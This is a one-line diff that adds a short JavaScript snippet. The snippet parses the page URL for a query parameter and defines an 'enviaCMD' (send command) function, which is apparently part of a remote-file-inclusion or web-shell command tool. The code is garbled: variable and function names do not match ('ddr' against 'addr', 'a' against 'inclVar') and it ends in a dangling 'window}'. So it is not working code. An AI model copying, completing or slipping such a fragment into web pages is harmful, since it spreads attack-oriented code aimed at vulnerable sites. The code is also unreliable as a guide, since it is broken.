@@ -1,0 +1,1 @@
+ <script>function a(){var ddr = location.href.substring(0,location.href.indexOf('?')+1);var stri = location.href.substring(addr.length,location.href.length+1);inclvar = stri.substring(0,stri.indexOf('='));} function enviaCMD(){inclVar();window} </script>
